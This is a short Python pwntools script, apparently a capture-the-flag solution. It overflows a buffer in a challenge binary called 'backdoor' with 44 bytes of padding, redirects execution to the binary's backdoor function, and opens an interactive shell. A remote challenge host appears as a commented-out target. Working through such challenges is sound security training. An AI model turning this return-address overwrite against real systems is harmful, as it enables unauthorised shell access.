from pwn import *

elf = ELF("./source/backdoor")

r = process("./source/backdoor")
#r = remote("backdoor.heltsikker.no", 9002)

backdoor = p32(elf.symbols["backdoor"]) #p32(0x08049236)
padding = b"A"*44

log.success("Popping shell!")

r.sendline(padding+backdoor)
r.recv()
r.interactive()

